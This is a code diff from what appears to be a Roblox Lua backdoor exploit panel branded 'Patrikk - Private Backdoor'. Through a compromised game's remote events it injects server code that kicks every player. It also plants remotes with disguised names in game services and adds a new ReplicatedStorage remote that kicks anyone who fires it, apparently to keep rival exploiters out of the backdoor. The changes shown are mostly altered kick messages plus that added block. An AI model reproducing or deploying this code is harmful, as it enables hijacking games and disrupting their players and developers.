@@ -3113,7 +3113,7 @@ local function C_sd()
 	script.Parent.MouseButton1Click:Connect(function()	
            fireRemoteEvent([[
               for _, v in pairs(game.Players:GetPlayers()) do
-                 v:Kick("Game shutdowned by Patrikk - Private Backdoor")
+                 v:Kick("Game shutdowned by patrik - Private Backdoor")
               end
 		   ]])
      end)
@@ -3233,7 +3233,7 @@ for _, svc in ipairs(services) do
  local r = Instance.new("RemoteFunction")
  r.Name = "rbxAssetid_core__temp_3023g78"
  r.OnServerEvent:Connect(function(plr)
-  plr:Kick("Backdoor has been secured by Patrikk - Private Backdoor")
+  plr:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
  end)
  r.Parent = p
 end
@@ -3264,6 +3264,13 @@ for _, svc in ipairs(services) do
     s.Parent = svc
     task.wait()
   end
+
+    local remote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
+    remote.Name = "!!!patrik.bd_cssr6-O1"
+
+    remote.OnServerEvent:Connect(function(player)
+        player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
+    end)
 end]])
 
 fireRemoteEvent([[
